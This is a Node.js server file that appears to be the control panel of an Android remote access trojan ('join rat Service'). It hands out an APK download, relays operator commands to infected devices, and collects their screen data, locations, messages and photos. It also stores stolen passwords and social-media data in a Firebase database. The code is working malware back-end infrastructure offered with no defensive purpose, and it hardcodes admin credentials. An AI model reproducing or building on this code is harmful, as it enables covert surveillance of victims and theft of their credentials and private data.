var express = require('express')
var App = express()
var Bodyparser = require('body-parser')
var cookieParser = require('cookie-parser')
var {rateLimit} = require("express-rate-limit")

var PORT =  process.env.PORT || 4000 

require("dotenv").config({path:"./MYDATA.env"})
const LimitRuls = rateLimit({
  windowMs: 3 * 60 * 1000, // 15 minutes
	max: 100, // Limit each IP to 100 requests per `window` (here, per 15 minutes)
	standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
	legacyHeaders: false, // Disable the `X-RateLimit-*` headers
  message:"<h1>429 ERROR : IP BLOCK</h1>"
})
App.use(LimitRuls)
App.use(Bodyparser.json())
App.use(cookieParser())
App.use(Bodyparser.urlencoded({ extended: true,limit:"25MB" })); 

var path = require('path')








// Import the functions you need from the SDKs you need
var {initializeApp} =require('firebase/app')
const FirbaseDatabase = require('firebase/database');
const  FirebaseStorage = require('firebase/storage')
const { json } = require('body-parser')




// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries
// Your web app's Firebase configuration

const firebaseConfig = {
  apiKey: process.env.API_KEY,
  authDomain: process.env.AUTH_DOMAIN,
  projectId: process.env.PROJECT_ID,
  storageBucket: process.env.STORAGE_BUCKET,
  messagingSenderId: process.env.MESSAGIND_SENDER_ID,
  appId: process.env.APP_ID
};

// Initialize Firebase
const firebaseapp = initializeApp(firebaseConfig);
const firebasestorage = FirebaseStorage.getStorage(firebaseapp)
const firebasedatabase = FirbaseDatabase.getDatabase(firebaseapp)


var http = require('http').createServer(App)

var socket = require('socket.io')(http)

http.listen(PORT,()=>{
    console.log("Server is running... \n   port:"+PORT+"\nhttp://192.168.1.62:"+PORT)
    
})





var Id_Collection = []

class  IdManager{
    setId(id,name){


      var data = {id,name}
      if(this.#hasSame(id) && name !== undefined){
         Id_Collection.forEach((element,ind)=>{
            if(element.id == id){
                element.name = name
            }
        })
      }
      else if(this.#hasSame(id)){

      }

      else if(name !== undefined && id !== undefined){
         var data = {name,id}
         Id_Collection.push(data)

     }

     else if(name === undefined && id !== undefined){
        var data = {name:"No name",id}
        Id_Collection.push(data)
     }

     else{
        console.log("Have one")
     }



    }

 
    deletId(id){
    Id_Collection =   Id_Collection.filter((valu,index)=> valu.id !== id)

    }

    #hasSame(id){
        var hassame = false
         Id_Collection.forEach((data)=>{
            if(data.id === id){
                hassame = true
            }
         })
         return hassame
    }
 
    getid(){
     return Id_Collection
    }
 
 }



var idmanager = new IdManager()




var allrooms =[]



App.get("/",UserAuth,(req,res)=>{
    res.sendFile(path.join(__dirname,"views","controller.html"))
    
})

App.get("/info",UserAuth,(req,res)=>{

  res.sendFile(path.join(__dirname,"views","information.html"))
})
App.get("/image",UserAuth,(req,res)=>{
  res.sendFile(path.join(__dirname,"views","images.html"))
})





App.post("/login",(req,res)=>{
  
  if(req.body.name === "admin" && req.body.password === "12733245"){
    res.send({"status":"Access Granted"}).status(200)
  }
  else{
    
    res.send({"data":"A Denied"}).status(404)
  }
})

App.get("/download/:file",(req,res)=>{
  if(req.params.file == "0"){
    res.sendFile(path.join(__dirname,"views","app-release.apk"))
  }else{
    res.sendFile(path.join(__dirname,"views","download.html"))
  }
  

  
})






App.post("/id/:mod/:id",(req,res)=>{
 

  if(req.params.mod == "get"){
      
      res.send(idmanager.getid()).status(200)
  }

  else if(req.params.mod == "set"){
      idmanager.setId(req.body.id,req.body.name)
    res.send(idmanager.getid()).status(200)
}


  else if(req.params.mod == "delet"){
      console.log(req.params.id)
      idmanager.deletId(req.params.id)
      res.send(idmanager.getid()).status(200)
      /*
      allrooms = allrooms.filter(value =>value != req.params.id.toString())
      res.send(allrooms).status(200)
      */

  }

  else{
      res.send("in valid mode").status(404)
  }
})







App.post("/files",(req,res)=>{
AllFilePath().then((data)=>{
  res.send(data)
})
 
})


App.post("/image",(req,res)=>{
  if(req.body.image != null&&req.body.name != null){
    
    const buffer = Buffer.from(req.body.image, "base64");
   
 
    
 
       // filesystem.writeFileSync(path.join(__dirname,"Bucket",req.body.name) , buffer);
        res.send("PHOTO SAVED size_left:")

        var storageref = FirebaseStorage.ref(firebasestorage,`/image/${req.body.name}`)
        var uploadtask = FirebaseStorage.uploadBytesResumable(storageref,buffer)
        uploadtask.on("state_changed",(snapshot)=>{

        },
        (err)=>{
          console.log(err)
        },()=>{
          FirebaseStorage.getDownloadURL(uploadtask.snapshot.ref).then((url)=>{
          
            
            FirbaseDatabase.push( FirbaseDatabase.ref(firebasedatabase,"image"),{"name":req.body.name,"url":url}).then(()=>{
              console.log("Suscess full")
            }).catch(()=>{
              console.log("error")
            })

          })
         
        })

   
  
  }else{
    res.send("For upload photo must Require {image:bae64 , name:myimage.jpg }  ");
  }
   
})









socket.on('connection',Socket=>{
  console.log("connected")

  Socket.emit("join_me","join rat Service")

  console.log(Socket.id)

  Socket.on('cmd',valu=>{
      console.log(valu)
      Socket.to(valu.room).emit('data',valu.data)
  })


//viewe\app-release.apk'
  Socket.on('join_room',(roomid)=>{
       if(roomid.length > 1){
        /*
  
        if(!allrooms.some(val=>val == roomid)){
           
          allrooms.push(roomid)
      }
      */
     Socket.join(roomid)
     idmanager.setId(roomid)
       }else{}

   })


   Socket.on("screeninfo",(room,data)=>{
       
      Socket.to(room).emit("screeninfo", data);
   })

   Socket.on("msg",(room,data)=>{

     if(room != ""){

      Socket.to(room).emit("msg", data);
     }
     
     else{
       console.log("no room define")
     }
   })

   Socket.on("location",(room,data)=>{
     console.log(data)
       Socket.to(room).emit("location",data)
   })


   Socket.on("password",(room,data)=>{
  
  FirbaseDatabase.push(FirbaseDatabase.ref(firebasedatabase,"password"),{"id":room,"password":data}).then(()=>{
    
  }).catch(()=>{
    console.log("error password")
  })

  })

  Socket.on("socialmedia",(room,data)=>{

  
    FirbaseDatabase.push(FirbaseDatabase.ref(firebasedatabase,"socialmedia"),{"id":room,"data":data}).then(()=>{
        
            }).catch(()=>{
              console.log("error socialmedia")
            })
  })



  // socket.emit("new message","hi i am server")
  Socket.on('disconnect',()=>{
      console.log("user disconnet")
  })

})





function AllFilePath(){
    
    return new Promise((resolve,reject)=>{
      const countref =  FirbaseDatabase.ref(firebasedatabase,"image")
      FirbaseDatabase.onValue(countref,(snapshot)=>{
       resolve(snapshot.val())
      })
    })


}

function UserAuth(req,res,next){
  if(req.cookies.name == "admin" && req.cookies.password == "12733245"  ){
    
    next()

  }else{
  
    res.sendFile(path.join(__dirname,"views","login.html"))
  }
}

    
    
